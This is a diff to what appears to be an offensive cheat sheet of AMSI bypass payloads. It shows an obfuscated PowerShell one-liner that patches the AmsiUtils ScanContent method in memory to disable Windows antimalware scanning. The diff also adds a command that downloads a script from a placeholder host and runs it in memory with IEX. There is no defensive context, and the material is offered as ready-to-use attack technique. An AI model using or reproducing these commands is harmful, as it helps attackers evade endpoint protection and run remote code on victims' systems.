@@ -1,5 +1,3 @@
-### By Passes
-
 AMSI payload 1:
 
 ```bash
@@ -16,6 +14,12 @@ AMSI payload 3
 
 ```bash
 class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1)
+```
+
+Or load into memory:
+
+```
+(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/amsi{$}.txt') | IEX
 ```
 
 This works quite well:
